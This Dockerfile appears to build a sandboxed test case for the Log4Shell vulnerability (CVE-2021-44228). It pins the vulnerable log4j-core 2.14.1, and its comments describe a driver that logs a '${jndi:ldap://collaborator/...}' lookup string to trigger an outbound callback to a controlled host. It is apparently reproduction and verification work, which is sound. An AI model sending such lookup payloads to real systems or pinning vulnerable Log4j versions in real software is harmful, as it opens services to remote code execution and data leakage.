# Case A — vulnerable checkpoint.
# log4j-core 2.14.1  (apache/logging-log4j2 rel/2.14.1
#                     commit d2d40d51efeb033f961882b79cddd05b54337fed)
#
# We pin the RELEASED Maven artifact (2.14.1), not a build from the git commit;
# the SHA above is recorded for provenance (see cases/cve-2021-44228.yaml).
#
# EFFECT-ONLY (RFC 0003 / RFC 0001 inv. 8): the app emits a log event carrying a
# ${jndi:ldap://collaborator/...} string. The observable is the outbound JNDI
# callback to the controlled collaborator. No malicious class is served.
#
# JDK base: temurin:8. The historic RCE class-load behavior depends on the JDK
# trustURLCodebase default, but the EFFECT-ONLY proof only needs the OUTBOUND
# JNDI callback, which fires regardless of that default.

FROM maven:3.9-eclipse-temurin-8 AS build
WORKDIR /src
COPY driver/pom.xml .
COPY driver/src ./src
RUN mvn -B -Dlog4j.version=2.14.1 -q clean package

FROM eclipse-temurin:8-jre
WORKDIR /app
COPY --from=build /src/target/caseA-jar-with-dependencies.jar /app/caseA.jar
# Default layout: 2.14.1 fires through the message itself.
COPY --from=build /src/target/classes/log4j2-default.xml /app/log4j2.xml
ENV LOG4J_CONFIGURATION_FILE=/app/log4j2.xml
# COLLABORATOR_HOST / COLLABORATOR_PORT / POE_TOKEN are injected by the sandbox.
ENTRYPOINT ["java", "-Dlog4j.configurationFile=/app/log4j2.xml", "-jar", "/app/caseA.jar"]
